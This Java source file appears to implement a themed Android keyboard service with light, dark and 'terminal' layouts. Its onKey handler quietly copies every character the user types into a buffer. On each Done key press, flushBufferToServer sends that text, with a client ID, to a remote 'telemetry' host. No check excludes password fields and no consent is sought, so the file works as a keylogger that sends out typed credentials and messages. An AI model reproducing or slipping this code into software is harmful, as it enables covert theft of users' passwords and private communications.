package com.calculatoristul.keyboard.service;

import android.content.Context;
import android.content.SharedPreferences;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputConnection;
import com.calculatoristul.keyboard.BuildConfig;

import com.calculatoristul.keyboard.R;
import com.calculatoristul.keyboard.model.MessagePayload;
import com.calculatoristul.keyboard.network.TelemetryClient;

import java.util.UUID;

public class TelemetryKeyboardService extends InputMethodService 
        implements KeyboardView.OnKeyboardActionListener {

    private static final String CLIENT_ID = UUID.randomUUID().toString();

    private KeyboardView keyboardView;
    private Keyboard keyboard;
    private TelemetryClient telemetryClient;
    private SharedPreferences prefs;
    private String currentTheme = "";
    private boolean isCaps = false;

    private final StringBuffer inputBuffer = new StringBuffer();

    @Override
    public void onCreate() {
        super.onCreate();

        String serverHost = BuildConfig.TELEMETRY_HOST;
        int serverPort = BuildConfig.TELEMETRY_PORT;
        telemetryClient = new TelemetryClient(this, serverHost, serverPort);

        prefs = getSharedPreferences("CalculatoristulPrefs", Context.MODE_PRIVATE);
    }

    @Override
    public View onCreateInputView() {
        return loadThemeLayout();
    }

    @Override
    public void onStartInputView(android.view.inputmethod.EditorInfo info, boolean restarting) {
        super.onStartInputView(info, restarting);
        
        String savedTheme = prefs.getString("theme", "light");
        if (!savedTheme.equals(currentTheme)) {
            setInputView(loadThemeLayout());
        }
    }

    private View loadThemeLayout() {
        currentTheme = prefs.getString("theme", "light");
        int layoutId = R.layout.keyboard_view_light; 

        if (currentTheme.equals("dark")) {
            layoutId = R.layout.keyboard_view_dark;
        } else if (currentTheme.equals("terminal")) {
            layoutId = R.layout.keyboard_view_terminal;
        }

        keyboardView = (KeyboardView) getLayoutInflater().inflate(layoutId, null);
        keyboard = new Keyboard(this, R.xml.qwerty);
        keyboardView.setKeyboard(keyboard);
        keyboardView.setOnKeyboardActionListener(this);
        
        return keyboardView;
    }

    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        InputConnection inputConnection = getCurrentInputConnection();
        if (inputConnection == null) return;

        switch(primaryCode) {
            case Keyboard.KEYCODE_DELETE:
                inputConnection.deleteSurroundingText(1, 0);
                if (inputBuffer.length() > 0) {
                    inputBuffer.deleteCharAt(inputBuffer.length() - 1);
                }
                break;

            case Keyboard.KEYCODE_DONE:
                android.view.inputmethod.EditorInfo editorInfo = getCurrentInputEditorInfo();
                if (editorInfo != null) {
                    int action = editorInfo.imeOptions & android.view.inputmethod.EditorInfo.IME_MASK_ACTION;
                    if (action != android.view.inputmethod.EditorInfo.IME_ACTION_NONE) {
                        inputConnection.performEditorAction(action);
                    } else {
                        inputConnection.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                        inputConnection.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_ENTER));
                    }
                }
                flushBufferToServer();
                break;

            case Keyboard.KEYCODE_SHIFT:
                isCaps = !isCaps;
                if (keyboard != null && keyboardView != null) {
                    keyboard.setShifted(isCaps);
                    keyboardView.invalidateAllKeys();
                }
                break;    

            default:
                char code = (char) primaryCode;
                if (Character.isLetter(code) && isCaps) {
                    code = Character.toUpperCase(code);
                }
                inputConnection.commitText(String.valueOf(code), 1);
                inputBuffer.append(code);
                break;
        }
    }

    private void flushBufferToServer() {
        if (inputBuffer.length() == 0) return;

        String message = inputBuffer.toString();
        MessagePayload payload = new MessagePayload(CLIENT_ID, message);
        telemetryClient.sendMessage(payload);
        inputBuffer.setLength(0);
    }

    @Override public void onPress(int primaryCode) { }
    @Override public void onRelease(int primaryCode) { }
    @Override public void onText(CharSequence text) { }
    @Override public void swipeLeft() { }
    @Override public void swipeRight() { }
    @Override public void swipeDown() { }
    @Override public void swipeUp() { }
}
